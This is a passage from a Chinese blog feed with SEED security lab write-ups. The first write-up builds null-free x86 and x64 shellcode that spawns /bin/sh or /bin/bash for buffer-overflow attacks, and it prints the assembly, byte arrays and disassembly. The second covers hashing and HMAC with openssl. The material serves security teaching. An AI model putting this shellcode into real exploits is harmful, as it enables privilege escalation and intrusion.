class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>可以使用conver.py得到二进制数组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./convert.py</span><br>Length of the shellcode: 35<br>shellcode= (<br>    &quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68&quot;<br>    &quot;\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0&quot;<br>    &quot;\x0b\xcd\x80&quot;<br>).encode(’latin-1’)<br></code></pre></td></tr></table></figure><h1 id="Task-1-b"><a href="#Task-1-b" class="headerlink" title="Task 1.b"></a>Task 1.b</h1><blockquote><p>Shellcode 广泛应用于缓冲区溢出攻击。在许多情况下，漏洞是由字符串复制引起的，例如 strcpy ()函数。对于这些字符串复制函数，零被认为是字符串的末尾。因此，如果我们在 shell 代码的中间有一个零，字符串复制将不能将零后面的任何内容从这个 shell 代码复制到目标缓冲区，因此攻击将不能成功</p></blockquote><p>因此我们有必要将上面二进制序列的0去除</p><p>一些去0的方法：</p><ul><li><p>使用<code>xor eax，eax</code>去取代<code>mov eax, 0</code></p></li><li><p>如果我们要存储0x0000099到 eax。我们不能只使用 mov eax，0x99，因为第二个操作数实际上是0x0000099，它包含三个零</p><ul><li>首先将 eax 设置为零，然后为 al 寄存器分配一个1字节的数字0x99</li></ul></li><li><p>使用移位操作</p><ul><li>下面操作等价于将<code>xyz\0</code>赋给ebx</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov ebx, &quot;xyz#&quot;<br>shl ebx, 8<br>shr ebx, 8<br></code></pre></td></tr></table></figure></li></ul><p>接下来到了第一个任务，我们需要执行/bin/bash，并且不可以有多余的/</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br><br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax<br>      push eax          ; Use 0 to terminate the string<br>        mov ebx,&quot;hhhh&quot;<br>        shl ebx, 24<br>        shr ebx, 24<br>        push ebx<br>      push &quot;/bas&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br>      ; Construct the argument array argv[]<br>      push eax          ; argv[1] = 0<br>      push ebx          ; argv[0] points &quot;/bin//sh&quot;<br>      mov  ecx, esp     ; Get the address of argv[]<br><br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br><br></code></pre></td></tr></table></figure><ul><li>我们需要构造出/bin/bash\0的字符串</li><li>由于直接使用0会导致strcpy失败，因此可以使用移位操作获取0</li><li>注意到push的操作数只能是32位/64数</li></ul><p>反汇编看一下结果，没有0字节</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00000000</span> &lt;_start&gt;:<br>   <span class="hljs-attribute">0</span>:<span class="hljs-number">31</span> c<span class="hljs-number">0</span>                xor    eax,eax<br>   <span class="hljs-attribute">2</span>:<span class="hljs-number">50</span>                   push   eax<br>   <span class="hljs-attribute">3</span>:bb <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">68</span>       mov    ebx,<span class="hljs-number">0</span>x<span class="hljs-number">68686868</span><br>   <span class="hljs-attribute">8</span>:c<span class="hljs-number">1</span> e<span class="hljs-number">3</span> <span class="hljs-number">18</span>             shl    ebx,<span class="hljs-number">0</span>x<span class="hljs-number">18</span><br>   <span class="hljs-attribute">b</span>:c<span class="hljs-number">1</span> eb <span class="hljs-number">18</span>             shr    ebx,<span class="hljs-number">0</span>x<span class="hljs-number">18</span><br>   <span class="hljs-attribute">e</span>:<span class="hljs-number">53</span>                   push   ebx<br>   <span class="hljs-attribute">f</span>:<span class="hljs-number">68</span> <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span class="hljs-number">61</span> <span class="hljs-number">73</span>       push   <span class="hljs-number">0</span>x<span class="hljs-number">7361622</span>f<br>  <span class="hljs-attribute">14</span>:<span class="hljs-number">68</span> <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e       push   <span class="hljs-number">0</span>x<span class="hljs-number">6</span>e<span class="hljs-number">69622</span>f<br>  <span class="hljs-attribute">19</span>:<span class="hljs-number">89</span> e<span class="hljs-number">3</span>                mov    ebx,esp<br>  <span class="hljs-attribute">1b</span>:<span class="hljs-number">50</span>                   push   eax<br>  <span class="hljs-attribute">1c</span>:<span class="hljs-number">53</span>                   push   ebx<br>  <span class="hljs-attribute">1d</span>:<span class="hljs-number">89</span> e<span class="hljs-number">1</span>                mov    ecx,esp<br>  <span class="hljs-attribute">1f</span>:<span class="hljs-number">31</span> d<span class="hljs-number">2</span>                xor    edx,edx<br>  <span class="hljs-attribute">21</span>:<span class="hljs-number">31</span> c<span class="hljs-number">0</span>                xor    eax,eax<br>  <span class="hljs-attribute">23</span>:b<span class="hljs-number">0</span> <span class="hljs-number">0</span>b                mov    al,<span class="hljs-number">0</span>xb<br>  <span class="hljs-attribute">25</span>:cd <span class="hljs-number">80</span>                int    <span class="hljs-number">0</span>x<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h1 id="Task-1-c"><a href="#Task-1-c" class="headerlink" title="Task 1.c"></a>Task 1.c</h1><p>使用execve实现以下命令的执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/sh -c &quot;ls -la&quot;<br></code></pre></td></tr></table></figure><p>汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax<br>      push eax          ; Use 0 to terminate the string<br>      push &quot;//sh&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>        push eax<br><br>        mov eax,&quot;##al&quot;<br>        shr eax,16<br>        push eax<br><br>        mov eax,&quot;ls -&quot;<br>        push eax<br>        mov  ecx,esp ;store ls -al into ecx<br><br>        xor eax,eax<br>        push eax<br>        mov eax,&quot;##-c&quot;<br>        shr eax,16<br>        push eax<br>        mov edx,esp ;store -c into edx<br><br>        xor eax,eax<br>        push eax ; 0 terminate<br>        push ecx ; ls -al<br>        push edx ; -c <br>        push ebx ; /bin/sh<br>        mov ecx,esp<br><br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br><br></code></pre></td></tr></table></figure><blockquote><p>Invoking execve(“/bin/sh”, argv, 0)</p><p>–<strong>eax</strong> = 0x0b: execve() system call number</p><p>–<strong>ebx</strong> = address of the command string “/bin/sh”</p><p>–<strong>ecx</strong> = address of the argument array argv</p><p>–<strong>edx</strong> = address of environment variables (set to 0)</p></blockquote><h1 id="Task-2-Using-Code-Segment"><a href="#Task-2-Using-Code-Segment" class="headerlink" title="Task 2: Using Code Segment"></a>Task 2: Using Code Segment</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>  global _start<br>    _start:<br>      <br>      BITS 32<br>        jmp short two<br>   <br>   one:<br>        pop ebx ; ebx储存字符串地址<br>        xor eax, eax ; 将eax置为0<br>        mov [ebx+7], al ;将al，也即是0替换*<br>        mov [ebx+8], ebx  ;将字符串的地址赋给AAAA所在的内存处(4 bytes)<br>        mov [ebx+12], eax ; 将0赋给BBBB所在内存处<br>        lea ecx, [ebx+8] ; ecx=ebx+8，也即是ecx储存/bin/sh\0的地址<br>        xor edx, edx ;edx为0，表示无环境变量<br>        mov al,  0x0b ;系统调用号<br>        int 0x80<br>        <br>    two:<br>        call one<br>        db &#x27;/bin/sh*AAAABBBB&#x27; <br></code></pre></td></tr></table></figure><p>程序的几点解释</p><ul><li><p>详见注释</p></li><li><p>程序先跳到two</p></li><li><p>two通过call指令调用one函数，这样的话，会将返回地址，也即是<code>&#39;/bin/sh*AAAABBBB&#39; </code>压入栈中，后面就可以使用pop ebx储存字符串地址</p></li></ul><p>为何可以触发shell：</p><ul><li>edx为0，表示无环境变量</li><li>ecx储存/bin/sh\0的地址</li><li>ebx储存db字符串地址</li></ul><p><strong>执行/usr/bin/env，并且打印出环境变量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>  global _start<br>    _start:<br>        BITS 32<br>        jmp short two<br>    one:<br>        pop ebx<br>        xor eax, eax<br><br>        ;the next 4 lines converse # into 0<br>        mov [ebx+12], al<br>        mov [ebx+15], al<br>        mov [ebx+20], al<br>        mov [ebx+25], al<br><br>        mov [ebx+26],ebx ;put address of &quot;/usr/bin/env\0&quot; to where AAAA is<br><br>        lea eax,[ebx+13]<br>        mov [ebx+30],eax ;put address of &quot;-i\0&quot; to where BBBB is <br><br>        lea eax,[ebx+16]<br>        mov [ebx+34],eax ;put address of &quot;a=11\0&quot; to where CCCC is<br><br>        lea eax,[ebx+21]<br>        mov [ebx+38],eax ;put address of &quot;b=22\0&quot; to where DDDD is<br><br>        xor eax,eax<br>        mov [ebx+42],eax ;0 terminate<br><br>        ; now ebx point to &quot;/usr/bin/env\0&quot;     <br><br>        lea ecx, [ebx+26] ;put address of &quot;/usr/bin/env -i a=11 b=22&quot; to ecx <br><br>        xor edx,edx ; edx = 0 <br><br>        mov al,  0x0b<br>        int 0x80<br>     two:<br>        call one<br>        db &#x27;/usr/bin/env#-i#a=11#b=22#AAAABBBBCCCCDDDDEEEE&#x27;<br>           ;012345678901234567890123456789012345678901234567890<br>           ;          1         2         3         4    <br></code></pre></td></tr></table></figure><ul><li>代码和详细注释见上面</li><li>‘/usr/bin/env#-i#a=11#b=22#AAAABBBBCCCCDDDDEEEE’是我们构造的字符串，通过call + pop指令可以获取该地址<ul><li><code>#</code>是占位符。为了防止0导致strcpy无法复制字符串，这里使用#作为占位符，后面会用al进行替换</li></ul></li><li><code>/usr/bin/env -i a=11 b=22</code>是我们要执行的命令（一定要注意到字符串最后有个\0）<ul><li>ecx存储argv的地址，因此指向ebx+26</li><li>ebx存储“/usr/bin/env\0”的地址</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mysh2: mysh2.s<br>nasm -f elf32 $@.s -o $@.o<br>ld --omagic -m elf_i386 $@.o -o $@<br></code></pre></td></tr></table></figure><p>编译执行，运行了新的shell（omagic 选项使得代码段是可写的）</p><h1 id="Task-3-Writing-64-bit-Shellcode"><a href="#Task-3-Writing-64-bit-Shellcode" class="headerlink" title="Task 3: Writing 64-bit Shellcode"></a>Task 3: Writing 64-bit Shellcode</h1><p>我们的任务是在64位的情况下执行<code>/bin/bash</code></p><p>注意到64位和32位的不同：</p><ul><li>对于 x64架构，调用系统调用是通过 syscall 指令完成的</li><li>系统调用的前三个参数分别存储在 rdx、 rsi 和 rdi 寄存器中</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>  global _start<br>    _start:<br>      ; The following code calls execve(&quot;/bin/sh&quot;, ...)<br>      xor  rdx, rdx       ; 3rd argument<br>      push rdx<br>        mov rax,&quot;h#######&quot;<br>        shl rax,56<br>        shr rax,56<br>        push rax<br>      mov rax,&#x27;/bin/bas&#x27;<br>      push rax<br>      mov rdi, rsp        ; 1st argument<br>      push rdx ; 重点是这两行<br>      push rdi <br>      mov rsi, rsp        ; 2nd argument<br>      xor  rax, rax<br>      mov al, 0x3b        ; execve()<br>      syscall<br></code></pre></td></tr></table></figure><p>几点需要注意的：</p><ul><li>rax是系统调用号，这里执行execve</li><li>rdi储存<code>/bin/bash\0</code>的地址</li><li>rdx是0</li></ul><p>objdump一下，发现确实没有0字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs asm">$ objdump -Mintel -d mysh_64<br><br>mysh_64:     file format elf64-x86-64<br><br><br>Disassembly of section .text:<br><br>0000000000401000 &lt;_start&gt;:<br>  401000:48 31 d2             xor    rdx,rdx<br>  401003:52                   push   rdx<br>  401004:48 b8 68 23 23 23 23 movabs rax,0x2323232323232368<br>  40100b:23 23 23 <br>  40100e:48 c1 e0 38          shl    rax,0x38<br>  401012:48 c1 e8 38          shr    rax,0x38<br>  401016:50                   push   rax<br>  401017:48 b8 2f 62 69 6e 2f movabs rax,0x7361622f6e69622f<br>  40101e:62 61 73 <br>  401021:50                   push   rax<br>  401022:48 89 e7             mov    rdi,rsp<br>  401025:52                   push   rdx<br>  401026:57                   push   rdi<br>  401027:48 89 e6             mov    rsi,rsp<br>  40102a:48 31 c0             xor    rax,rax<br>  40102d:b0 3b                mov    al,0x3b<br>  40102f:0f 05                syscall <br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：One-Way-Hash-Function-and-MAC</title>
    <link href="/p/ae23a610/"/>
    <url>/p/ae23a610/</url>
    
    <content type="html"><![CDATA[<h1 id="hash简介"><a href="#hash简介" class="headerlink" title="hash简介"></a>hash简介</h1><p>Hash函数也叫杂凑函数、散列函数、哈希函数，可以把消息或数据压缩成固定长度的摘要</p><h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><ul><li>等长性：给出任意的输入，得到的输出（摘要）长度不变。比如sha-1得到的摘要固定是160位，md5为128位</li><li>单向性：任给x，得到$y=h(x)$是容易的，任给$y=h(x)$，得到x是困难的</li><li>抗弱碰撞性：已知x，找到不与x相等的y满足$h(x)=h(y)$是不可行的</li><li>抗强碰撞性：找到任意两个不同的输入$x，y$使得$h(x)=h(y)$是不可行的</li></ul><h2 id="哈希碰撞"><a href="#哈希碰撞" class="headerlink" title="哈希碰撞"></a>哈希碰撞</h2><p><img src="https://img.gls.show/img/202306112258191.png"></p><ul><li>根据抗碰撞性，不会有两个不同的输入，使得哈希运算后的输出相等</li><li>如果找到反例，比如上图中John和Sandra的输出相等，则称产生了哈希碰撞</li></ul><h2 id="空间分析"><a href="#空间分析" class="headerlink" title="空间分析"></a>空间分析</h2><p>16个二进制位的哈希值，产生碰撞的可能性是 65536 分之一。也就是说，如果有65537个用户，就一定会产生碰撞。哈希值的长度扩大到32个二进制位，碰撞的可能性就会下降到 4,294,967,296 分之一。</p><h2 id="生日悖论"><a href="#生日悖论" class="headerlink" title="生日悖论"></a>生日悖论</h2><p>在一个房间中，如果有23人，则存在两个人的生日相同的概率要大于50%。这个“悖论”并非是逻辑中的悖论，而是与直观感觉相悖，因此被称为生日悖论。当人数增加时，该概率也会增加。若人数为50，则存在两个人的生日相同的概率要大于97%。</p><p>n个人中，每个人的生日日期都不同的概率：<br>$$<br> {\bar {p}}(n)=1\cdot \left(1-{\frac {1}{365}}\right)\cdot \left(1-{\frac {2}{365}}\right)\cdots \left(1-{\frac {n-1}{365}}\right)={\frac {365}{365}}\cdot {\frac {364}{365}}\cdot {\frac {363}{365}}\cdot {\frac {362}{365}}\cdots {\frac {365-n+1}{365}}<br>$$<br>p(n）表示n个人中至少2人生日相同的概率</p><p>$$<br> p(n)=1-{\bar {p}}(n)=1-{365! \over 365^{n}(365-n)!}<br>$$</p><h2 id="哈希碰撞-1"><a href="#哈希碰撞-1" class="headerlink" title="哈希碰撞"></a>哈希碰撞</h2><ul><li>因此，由上可知，如果哈希值的取值空间是365，只要计算23个哈希值，就有50%的可能产生碰撞</li><li>为了防止哈希碰撞，需要增大哈希映射的空间</li></ul><h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><p>首先，配置和安装 openssl 库</p><p>进入openssl文件夹，执行make命令</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># cd /home/seed/openssl-1.0.1</span><br><span class="hljs-meta"># make </span><br><span class="hljs-meta"># make test </span><br><span class="hljs-meta"># make install </span><br></code></pre></td></tr></table></figure><p>安装十六进制编辑器，以便于查看和修改二进制格式的文件。预制的vm中已经为我们安装了GHex</p><h1 id="Task-1-Generating-Message-Digest-and-MAC"><a href="#Task-1-Generating-Message-Digest-and-MAC" class="headerlink" title="Task 1: Generating Message Digest and MAC"></a>Task 1: Generating Message Digest and MAC</h1><p>给文件file.txt写入值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/11/2023 07:51] seed@ubuntu:~$ echo 1 &gt; file.txt <br>[06/11/2023 07:51] seed@ubuntu:~$ cat file.txt <br>1<br>[06/11/2023 07:52] seed@ubuntu:~$ <br><br></code></pre></td></tr></table></figure><p>使用不同算法计算哈希值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/11/2023 07:52] seed@ubuntu:~$ openssl dgst -md5 file.txt <br>MD5(file.txt)= b026324c6904b2a9cb4b88d6d61c81d1<br>[06/11/2023 07:52] seed@ubuntu:~$ openssl dgst -sha1 file.txt <br>SHA1(file.txt)= e5fa44f2b31c1fb553b6021e7360d07d5d91ff5e<br>[06/11/2023 07:52] seed@ubuntu:~$ openssl dgst -sha256 file.txt <br>SHA256(file.txt)= 4355a46b19d348dc2f57c046f8ef63d4538ebb936000f3c9ee954a27460dd865<br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">哈希算法</th><th align="center">文件名</th><th align="center">哈希值</th></tr></thead><tbody><tr><td align="center">MD5</td><td align="center">file.txt</td><td align="center">b026324c6904b2a9cb4b88d6d61c81d1</td></tr><tr><td align="center">SHA1</td><td align="center">file.txt</td><td align="center">e5fa44f2b31c1fb553b6021e7360d07d5d91ff5e</td></tr><tr><td align="center">SHA256</td><td align="center">file.txt</td><td align="center">4355a46b19d348dc2f57c046f8ef63d4538ebb936000f3c9ee954a27460dd865</td></tr></tbody></table><h1 id="Task-2-Keyed-Hash-and-HMAC"><a href="#Task-2-Keyed-Hash-and-HMAC" class="headerlink" title="Task 2: Keyed Hash and HMAC"></a>Task 2: Keyed Hash and HMAC</h1><p>为一个文件生成一个含有秘钥的哈希(即 MAC)可以使用-hmac 选项(这个选项目前没有文档说明，但是 openssl 支持它)</p><p>下面的示例使用 HMAC-MD5算法为文件生成键控哈希。- hmac 选项后面的字符串是密钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> openssl dgst -md5 -hmac <span class="hljs-string">&quot;abcdefg&quot;</span> filename</span><br></code></pre></td></tr></table></figure><blockquote><p>在 HMAC 我们一定要用固定大小的钥匙吗？如果是，密钥大小是多少？如果没有，为什么？</p></blockquote><p>尝试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/11/2023 07:55] seed@ubuntu:~$ openssl dgst -hmac &#x27;aaaa&#x27; -md5 file.txt<br>HMAC-MD5(file.txt)= abc3af6de7e79bcf63c145b691486b3a<br>[06/11/2023 08:07] seed@ubuntu:~$ openssl dgst -hmac &#x27;aaaaaaaa&#x27; -md5 file.txt<br>HMAC-MD5(file.txt)= 3e6883461e3b7962e28680120799b618<br>[06/11/2023 08:07] seed@ubuntu:~$ openssl dgst -hmac &#x27;a&#x27; -md5 file.txt<br>HMAC-MD5(file.txt)= 47105645a0aafa20383f8ed98841e11d<br>[06/11/2023 08:08] seed@ubuntu:~$ openssl dgst -hmac &#x27;&#x27; -md5 file.txt<br>HMAC-MD5(file.txt)= 6f1b585dfcb5ef68c77a4dd227a6dd45<br>[06/11/2023 08:08] seed@ubuntu:~$ openssl dgst -hmac &#x27; &#x27; -md5 file.txt<br>HMAC-MD5(file.txt)= 6600036474432850121f816e2f570295<br></code></pre></td></tr></table></figure><p>这说明不是必须具有固定的大小，密钥长度可以是任意的</p><p>为了解释这个结果，我们需要深入一下hmac的原理</p><p>hmac，也即是基于哈希函数和密钥的消息认证码（Hash-based Message Authentication Code），可以用来验证消息的完整性和真实性</p><p>HMAC的计算过程如下</p><ol><li>如果密钥K的长度大于哈希函数的分组长度，就用哈希函数对密钥K进行哈希运算，得到一个新的密钥K’，并用0填充到分组长度。</li><li>如果密钥K的长度小于哈希函数的分组长度，就用0填充到分组长度，得到一个新的密钥K’。</li><li>用密钥K’和一个常量ipad（00110110）进行异或运算，得到一个内部密钥Ki。</li><li>用密钥K’和一个常量opad（01011100）进行异或运算，得到一个外部密钥Ko。</li><li>用内部密钥Ki和消息M进行连接，然后用哈希函数对连接结果进行哈希运算，得到一个中间结果H(Ki∣M)。</li><li>用外部密钥Ko和中间结果H(Ki∣M)进行连接，然后用哈希函数对连接结果进行哈希运算，得到最终的HMAC值H(Ko∣H(Ki∣M))。</li></ol><p>HMAC可以使用不同的哈希函数，例如SHA-1、SHA-256等，生成的HMAC值的长度与哈希函数的输出长度相同</p><h1 id="Task-3-The-Randomness-of-One-way-Hash"><a href="#Task-3-The-Randomness-of-One-way-Hash" class="headerlink" title="Task 3: The Randomness of One-way Hash"></a>Task 3: The Randomness of One-way Hash</h1><p>现在我们有一个文件，使用ghex观察bit为<code>310A</code></p><p>先计算md5</p><p>修改为<code>110A</code></p><p>再次执行计算</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/11/2023 08:16] root@ubuntu:/home/seed# openssl dgst -md5 file.txt <br>MD5(file.txt)= b026324c6904b2a9cb4b88d6d61c81d1<br><br>[06/11/2023 08:17] root@ubuntu:/home/seed# openssl dgst -md5 file.txt <br>MD5(file.txt)= fb053f5c08e90c03a38b470476a61991<br></code></pre></td></tr></table></figure><p>写个脚本计算下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">compare_strings</span>(<span class="hljs-params">a, b</span>):</span><br>  <span class="hljs-comment"># 如果两个字符串为空，就返回0</span><br>  <span class="hljs-keyword">if</span> a <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> b <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>  <span class="hljs-comment"># 如果两个字符串长度不等，就返回0</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) != <span class="hljs-built_in">len</span>(b):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>  <span class="hljs-comment"># 初始化计数器</span><br>  count = <span class="hljs-number">0</span><br>  <span class="hljs-comment"># 使用for循环遍历两个字符串的每个字符</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-comment"># 如果字符相等，就把计数器加一</span><br>    <span class="hljs-keyword">if</span> a[i] == b[i]:<br>      count += <span class="hljs-number">1</span><br>  <span class="hljs-comment"># 返回计数器的值</span><br>  <span class="hljs-keyword">return</span> count<br><br><span class="hljs-comment"># 测试代码</span><br>a = <span class="hljs-string">&quot;b026324c6904b2a9cb4b88d6d61c81d1&quot;</span><br>b = <span class="hljs-string">&quot;fb053f5c08e90c03a38b470476a61991&quot;</span><br><span class="hljs-built_in">print</span>(compare_strings(a, b))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a)-compare_strings(a, 